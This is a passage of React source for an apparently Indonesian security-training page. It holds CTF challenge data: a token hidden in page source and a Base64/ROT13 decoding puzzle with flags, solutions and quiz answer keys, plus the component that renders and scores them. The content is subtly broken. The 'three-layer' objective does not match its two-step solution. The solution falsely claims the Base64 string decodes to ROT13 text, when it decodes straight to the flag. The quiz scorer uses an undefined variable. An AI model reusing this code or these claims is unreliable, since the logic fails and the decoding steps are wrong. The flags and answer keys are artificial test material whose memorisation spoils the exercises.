   Cari di dalam tag \`<script>\`. Decode Base64-nya.
   \`atob("Q29kZUJvb2t7anNfdmFyX3Rva2VufQ==")\`
   \`CodeBook{js_var_token}\`

## Pelajaran
- Jangan pernah simpan informasi sensitif di komentar HTML.
- Jangan simpan API key atau token rahasia di frontend JavaScript.
- Bersihkan kode dari debugging info sebelum deploy ke production.`,
    quiz: [
      { q: 'Di mana tempat yang TIDAK aman menyimpan token?', options: ['Environment variable (server)', 'HTML Comment', 'Vault', 'Encrypted Database'], correct: 1 },
      { q: 'Cara melihat source code website di browser?', options: ['Ctrl+P', 'Ctrl+U', 'Ctrl+S', 'Ctrl+F'], correct: 1 },
      { q: 'robots.txt digunakan untuk?', options: ['Menyimpan password', 'Memberi instruksi ke search engine crawler', 'Menjalankan robot', 'Hapus virus'], correct: 1 },
      { q: 'Apa itu Inspect Element?', options: ['Tool untuk edit foto', 'Tool developer untuk melihat dan mengubah DOM/CSS secara real-time', 'Antivirus', 'Database manager'], correct: 1 },
      { q: 'Mengapa menyimpan token di JavaScript frontend berbahaya?', options: ['Bikin lemot', 'Siapapun bisa melihatnya melalui browser', 'Hanya bisa dibaca Google', 'Mudah terhapus'], correct: 1 },
    ],
  },
  'ctf-crypto': {
    title: 'Decode the Secret Message',
    icon: '🔐',
    difficulty: 'Advanced',
    xp: 350,
    category: 'CTF',
    objective: 'Decode pesan tersembunyi yang di-encode dengan 3 layer berbeda: Base64 → ROT13 → Hex. Temukan flag-nya!',
    theory: `## Encoding vs Enkripsi

Encoding BUKAN enkripsi — siapapun yang tahu algoritmanya bisa decode.

### Base64
Encode binary data ke ASCII printable. Dikenali dari karakter A-Z, a-z, 0-9, +, /, = di akhir.

### ROT13
Rotasi huruf 13 posisi. A→N, B→O, dst. ROT13 dua kali = balik ke asli.

### Hex
Representasi binary dalam format hexadecimal (0-9, A-F).`,
    vulnerable: `// ENCODED MESSAGE - Coba decode ini!
const layer1 = "Q29kZUJvb2t7WW91X0ZvdW5kX1RoZV9TZWNyZXR9"
// Layer 1: Base64
// Hint: atob() di browser, atau Buffer.from(x, 'base64').toString() di Node

// Setelah decode layer 1, kamu dapat string yang di-ROT13
// Layer 2: ROT13  
// Hint: String.fromCharCode((c.charCodeAt(0) - 65 + 13) % 26 + 65)

// FLAG FORMAT: CodeBook{...}

// Tools yang bisa kamu gunakan:
console.log(atob("Q29kZUJvb2t7WW91X0ZvdW5kX1RoZV9TZWNyZXR9"))`,
    payloads: [
      { label: 'Decode Base64', code: `// Step 1: Decode Base64\nconst encoded = "Q29kZUJvb2t7WW91X0ZvdW5kX1RoZV9TZWNyZXR9"\nconst decoded = atob(encoded)\nconsole.log("Base64 decoded:", decoded)`, desc: 'Gunakan atob() untuk decode Base64 di browser' },
      { label: 'ROT13 Function', code: `function rot13(str) {\n  return str.replace(/[a-zA-Z]/g, c => {\n    const base = c <= 'Z' ? 65 : 97\n    return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base)\n  })\n}\nconsole.log(rot13("CbqrObbx{Lbh_Sbhaq_Gur_Frperg}"))`, desc: 'Implementasi ROT13 untuk decode layer kedua' },
    ],
    fix: `## Solusi Lengkap

\`\`\`javascript
// Step 1: Decode Base64
const layer1 = "Q29kZUJvb2t7WW91X0ZvdW5kX1RoZV9TZWNyZXR9"
const step1 = atob(layer1)
console.log("Step 1:", step1)
// Output: "CbqrObbx{Lbh_Sbhaq_Gur_Frperg}"

// Step 2: ROT13
function rot13(str) {
  return str.replace(/[a-zA-Z]/g, c => {
    const base = c <= 'Z' ? 65 : 97
    return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base)
  })
}
const step2 = rot13(step1)
console.log("Step 2:", step2)
// Output: "CodeBook{You_Found_The_Secret}"

// FLAG: CodeBook{You_Found_The_Secret} 🎉
\`\`\`

## Pelajaran

- **Base64** bukan enkripsi — siapapun bisa decode
- **ROT13** bukan enkripsi — hanya shift karakter 
- Untuk enkripsi nyata gunakan: AES-256, RSA, ChaCha20
- Di web: gunakan HTTPS (TLS) untuk enkripsi data in-transit`,
    quiz: [
      { q: 'Base64 adalah?', options: ['Algoritma enkripsi', 'Format encoding binary ke ASCII', 'Hash function', 'Protokol jaringan'], correct: 1 },
      { q: 'ROT13 dua kali menghasilkan?', options: ['String yang semakin terencode', 'String asli kembali', 'Error', 'ROT26'], correct: 1 },
      { q: 'Perbedaan encoding dan enkripsi?', options: ['Tidak ada perbedaan', 'Encoding bisa di-reverse siapapun, enkripsi butuh kunci', 'Enkripsi lebih cepat', 'Encoding lebih aman'], correct: 1 },
      { q: 'Algoritma yang tepat untuk enkripsi data sensitif?', options: ['Base64', 'ROT13', 'AES-256', 'Hex'], correct: 2 },
      { q: 'atob() di JavaScript digunakan untuk?', options: ['Konversi ASCII ke binary', 'Decode Base64 string', 'Encode string ke Base64', 'Hash string'], correct: 1 },
    ],
  },
}

export default function TantanganDetailPage() {
  const { id } = useParams()
  const [tab, setTab] = useState('theory')
  const [answers, setAnswers] = useState({})
  const [submitted, setSubmitted] = useState(false)
  const [score, setScore] = useState(0)
  const [copied, setCopied] = useState(null)
  const [user, setUser] = useState(null)
  const [xpGained, setXpGained] = useState(false)

  const challenge = CHALLENGE_DATA[id]

  useEffect(() => {
    const s = localStorage.getItem('cb_user')
    if (s) setUser(JSON.parse(s))
  }, [])

  if (!challenge) return (
    <div className="min-h-screen bg-[#020617] flex items-center justify-center">
      <div className="text-center">
        <div className="text-5xl mb-4">🔍</div>
        <p className="text-white font-bold mb-2">Tantangan tidak ditemukan</p>
        <Link href="/tantangan" className="text-violet-400">← Kembali</Link>
      </div>
    </div>
  )

  const handleCopy = (code, idx) => {
    navigator.clipboard.writeText(code)
    setCopied(idx)
    setTimeout(() => setCopied(null), 2000)
    toast.success('Code disalin!')
  }

  const handleSubmitQuiz = async () => {
    const total = challenge.quiz.length
    if (Object.keys(answers).length < total) { toast.error('Jawab semua soal dulu!'); return }
    let correct = 0
    challenge.quiz.forEach((q, i) => { if (answers[qi] === q.correct) correct++ })
    const finalScore = Math.round((correct / total) * 100)
    setScore(finalScore)
    setSubmitted(true)

    if (finalScore >= 80 && !xpGained && user) {
      // Award XP
      try {
        await fetch('/api/progress', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          credentials: 'include',
          body: JSON.stringify({ materiSlug: `tantangan-${id}`, xpEarned: challenge.xp, badgeId: null }),
        })
        setXpGained(true)
        const stored = localStorage.getItem('cb_user')
        if (stored) {
          const u = JSON.parse(stored)
          localStorage.setItem('cb_user', JSON.stringify({ ...u, xp: (u.xp||0) + challenge.xp }))
        }
        toast.success(`Tantangan selesai! +${challenge.xp} XP 🎉`)
      } catch {}
    } else if (finalScore < 80) {
      toast.error(`Nilai ${finalScore}% — perlu ≥80% untuk menyelesaikan tantangan`)
    }
  }

  const TABS = [
    { id: 'theory', label: '📖 Teori' },
    { id: 'lab', label: challenge.category === 'Coding' ? '💻 Coding' : '🔬 Lab' },
    { id: 'fix', label: '🛡️ Solusi & Fix' },
    { id: 'quiz', label: '🧠 Quiz' },
  ]

  function renderMarkdown(text) {
    if (!text) return null
    const lines = text.split('\n')
    const result = []
    let i = 0, inCode = false, codeLines = []
    while (i < lines.length) {
      const line = lines[i]
      if (line.startsWith('```')) {
        if (!inCode) { inCode = true; codeLines = [] }
        else {
          inCode = false
          result.push(<pre key={`c${i}`} className="bg-[#020617] border border-slate-800 rounded-xl p-4 overflow-x-auto my-3 text-sm font-mono text-slate-300 leading-relaxed"><code>{codeLines.join('\n')}</code></pre>)
        }
        i++; continue
      }
      if (inCode) { codeLines.push(line); i++; continue }
      if (line.startsWith('## ')) result.push(<h2 key={i} className="text-base font-black text-slate-200 mt-5 mb-2 pb-1.5 border-b border-slate-800">{line.slice(3)}</h2>)
      else if (line.startsWith('### ')) result.push(<h3 key={i} className="text-sm font-bold text-violet-400 mt-3 mb-1.5">{line.slice(4)}</h3>)
      else if (line.startsWith('- ')) result.push(<li key={i} className="text-slate-400 text-sm ml-4 my-1 leading-relaxed" dangerouslySetInnerHTML={{ __html: line.slice(2).replace(/\*\*(.*?)\*\*/g,'<strong class="text-slate-200">$1</strong>').replace(/`([^`]+)`/g,'<code class="bg-slate-800 px-1.5 rounded text-violet-400 text-xs font-mono">$1</code>') }} />)
      else if (line.trim()) result.push(<p key={i} className="text-slate-400 text-sm leading-relaxed my-2" dangerouslySetInnerHTML={{ __html: line.replace(/\*\*(.*?)\*\*/g,'<strong class="text-slate-200">$1</strong>').replace(/`([^`]+)`/g,'<code class="bg-slate-800 px-1.5 rounded text-violet-400 text-xs font-mono">$1</code>') }} />)
      i++
    }
    return <div>{result}</div>
  }

  return (
    <div className="min-h-screen bg-[#020617]">
      <Navbar />
      <div className="max-w-4xl mx-auto px-4 py-24">
        {/* Header */}
        <div className="flex items-center gap-2 text-sm text-slate-600 mb-6">
          <Link href="/tantangan" className="hover:text-violet-400 transition-colors">Tantangan</Link>
          <span>/</span>
          <span className="text-slate-400">{challenge.title}</span>
        </div>

        <div className="p-6 rounded-2xl bg-[#0f172a] border border-white/[0.06] mb-6">
          <div className="flex items-start gap-4">
            <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-slate-800 to-slate-900 border border-white/[0.06] flex items-center justify-center text-3xl flex-shrink-0">
              {challenge.icon}
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 mb-2 flex-wrap">
                <span className="badge badge-purple">{challenge.category}</span>
                <span className="badge badge-yellow">{challenge.difficulty}</span>
                <span className="badge badge-blue">+{challenge.xp} XP</span>
              </div>
              <h1 className="text-xl font-black text-white mb-2">{challenge.title}</h1>
              <p className="text-slate-400 text-sm leading-relaxed">
                <strong className="text-violet-400">🎯 Objective:</strong> {challenge.objective}
              </p>
            </div>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex gap-1 p-1 bg-[#0f172a] border border-white/[0.06] rounded-xl mb-6 overflow-x-auto">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`flex-shrink-0 px-4 py-2.5 rounded-lg text-sm font-bold transition-all ${tab===t.id ? 'bg-violet-600 text-white shadow-lg shadow-violet-500/20' : 'text-slate-500 hover:text-slate-200'}`}>
              {t.label}
            </button>
          ))}
        </div>

        {/* Theory */}
        {tab === 'theory' && (
          <div className="p-6 rounded-2xl bg-[#0f172a] border border-white/[0.06]">
            {renderMarkdown(challenge.theory)}
          </div>
        )}

        {/* Lab / Coding */}
        {tab === 'lab' && (
          <div className="space-y-4">
            <div className="p-4 rounded-2xl bg-yellow-500/8 border border-yellow-500/20">
              <p className="text-yellow-400 text-sm font-bold mb-1">
                {challenge.category === 'Security Lab' ? '⚠️ Lab Edukasi' : '💻 Coding Challenge'}
              </p>
              <p className="text-slate-400 text-xs">
                {challenge.category === 'Security Lab'
                  ? 'Ini adalah environment edukasi yang aman. Teknik ini hanya boleh digunakan pada sistem yang kamu miliki atau dengan izin tertulis. Tujuan: pahami celah agar bisa diamankan.'
                  : 'Coba kerjakan tantangan ini sendiri dulu! Lihat tab Solusi jika sudah mencoba.'}
              </p>
            </div>

            {/* Vulnerable/Starter Code */}
            <div>
              <p className="text-xs font-bold text-slate-500 mb-2 uppercase tracking-wider">
                {challenge.category === 'Security Lab' ? '🔴 Kode Rentan (untuk dipelajari)' : '📝 Starter Code'}
              </p>
              <div className="relative rounded-2xl overflow-hidden border border-slate-800">
                <div className="flex items-center justify-between px-4 py-2.5 bg-[#020617] border-b border-slate-800">
                  <span className="text-xs text-slate-600 font-mono">code</span>
                  <button onClick={() => handleCopy(challenge.vulnerable, 'vuln')}
                    className="text-xs text-violet-400 hover:text-violet-300 transition-colors">
                    {copied === 'vuln' ? '✓ Disalin!' : '📋 Copy'}
                  </button>
                </div>
                <pre className="p-4 text-xs font-mono text-slate-300 overflow-x-auto bg-[#020617] leading-relaxed">
                  <code>{challenge.vulnerable}</code>
                </pre>
              </div>
            </div>

            {/* Payloads / Hints */}
            <div>
              <p className="text-xs font-bold text-slate-500 mb-2 uppercase tracking-wider">
                {challenge.category === 'Security Lab' ? '🧪 Payload untuk Dicoba' : '💡 Hints & Solusi Parsial'}
              </p>
              <div className="space-y-3">
                {challenge.payloads.map((p, i) => (
                  <div key={i} className="p-4 rounded-xl bg-[#0f172a] border border-white/[0.06]">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs font-bold text-violet-400">{p.label}</span>
                      <button onClick={() => handleCopy(p.code, i)}
                        className="text-xs text-slate-500 hover:text-violet-400 transition-colors">
                        {copied === i ? '✓ Disalin!' : '📋 Copy'}
                      </button>
                    </div>
                    <code className="block text-xs font-mono text-emerald-400 bg-[#020617] rounded-lg p-3 mb-2 overflow-x-auto whitespace-pre">{p.code}</code>
                    <p className="text-xs text-slate-600">{p.desc}</p>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Fix/Solution */}
        {tab === 'fix' && (
          <div className="p-6 rounded-2xl bg-[#0f172a] border border-white/[0.06]">
            <div className="flex items-center gap-2 mb-4 p-3 rounded-xl bg-emerald-500/8 border border-emerald-500/20">
              <span className="text-lg">✅</span>
              <p className="text-emerald-400 text-sm font-semibold">Cara aman / solusi lengkap ada di bawah ini</p>
            </div>
            {renderMarkdown(challenge.fix)}
          </div>
        )}

        {/* Quiz */}
        {tab === 'quiz' && (
          <div>
            <div className="mb-4 p-3.5 rounded-xl bg-violet-500/8 border border-violet-500/20">
              <p className="text-xs text-violet-300"><strong>📋 {challenge.quiz.length} soal</strong> — Nilai ≥80% untuk mendapatkan +{challenge.xp} XP</p>
            </div>
            {!submitted ? (
              <div className="space-y-4">
                {challenge.quiz.map((q, qi) => (
                  <div key={qi} className="p-5 rounded-2xl bg-[#0f172a] border border-white/[0.06]">
                    <p className="font-semibold text-white text-sm mb-3 flex items-start gap-2">
                      <span className="w-6 h-6 rounded-full bg-violet-600 flex items-center justify-center text-white text-xs font-black flex-shrink-0">{qi+1}</span>
                      {q.q}
                    </p>
                    <div className="space-y-2">
                      {q.options.map((opt, oi) => (
                        <button key={oi} onClick={() => setAnswers(p => ({...p, [qi]: oi}))}
                          className={`w-full text-left px-4 py-2.5 rounded-xl text-sm border transition-all ${answers[qi]===oi ? 'bg-violet-600/15 border-violet-500/40 text-violet-300' : 'bg-[#1e293b] border-white/[0.06] text-slate-400 hover:border-white/10 hover:text-slate-200'}`}>
                          <span className="inline-flex items-center gap-3">
                            <span className={`w-5 h-5 rounded-full border flex-shrink-0 flex items-center justify-center text-xs font-bold ${answers[qi]===oi ? 'bg-violet-600 border-violet-600 text-white' : 'border-slate-600 text-slate-600'}`}>
                              {answers[qi]===oi ? '✓' : String.fromCharCode(65+oi)}
                            </span>
                            {opt}
                          </span>
                        </button>
                      ))}
                    </div>
                  </div>
                ))}
                <button onClick={handleSubmitQuiz} disabled={Object.keys(answers).length < challenge.quiz.length}
                  className="w-full py-3 rounded-xl font-bold bg-violet-600 hover:bg-violet-500 text-white disabled:opacity-50 transition-all">
                  {Object.keys(answers).length < challenge.quiz.length
                    ? `Jawab ${challenge.quiz.length - Object.keys(answers).length} soal lagi`
                    : '✓ Submit Jawaban'}
                </button>
              </div>
            ) : (
              <div>
                <div className={`p-6 rounded-2xl border text-center mb-4 ${score >= 80 ? 'bg-emerald-500/5 border-emerald-500/25' : 'bg-red-500/5 border-red-500/20'}`}>
                  <div className="text-5xl font-black text-white mb-2">{score}%</div>
                  <p className={`font-black text-lg mb-2 ${score >= 80 ? 'text-emerald-400' : 'text-red-400'}`}>
                    {score >= 80 ? '🎉 Tantangan Selesai!' : '❌ Belum Lulus (min 80%)'}
                  </p>
                  {score >= 80 && xpGained && <p className="text-violet-400 text-sm">+{challenge.xp} XP didapat!</p>}
                </div>
                <div className="space-y-2 mb-4">
                  {challenge.quiz.map((q, qi) => {
                    const right = answers[qi] === q.correct
                    return (
                      <div key={qi} className={`p-3.5 rounded-xl border ${right ? 'bg-emerald-500/5 border-emerald-500/15' : 'bg-red-500/5 border-red-500/15'}`}>
                        <div className="flex items-start gap-2">
                          <span>{right ? '✅' : '❌'}</span>
                          <div>
                            <p className="text-slate-300 text-xs font-semibold">{q.q}</p>
                            {!right && <p className="text-emerald-400 text-xs mt-0.5">✓ {q.options[q.correct]}</p>}
                          </div>
                        </div>
                      </div>
                    )
                  })}
                </div>
                <div className="flex gap-3">
                  <button onClick={() => { setAnswers({}); setSubmitted(false); setScore(0) }}
                    className="flex-1 py-2.5 rounded-xl text-sm font-bold text-slate-400 bg-[#0f172a] border border-white/[0.06] hover:text-white transition-all">
                    🔄 Coba Lagi
                  </button>
                  <Link href="/tantangan" className="flex-1 py-2.5 rounded-xl text-sm font-bold text-center bg-violet-600 hover:bg-violet-500 text-white transition-all">
                    ← Tantangan Lain
                  </Link>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  )
}
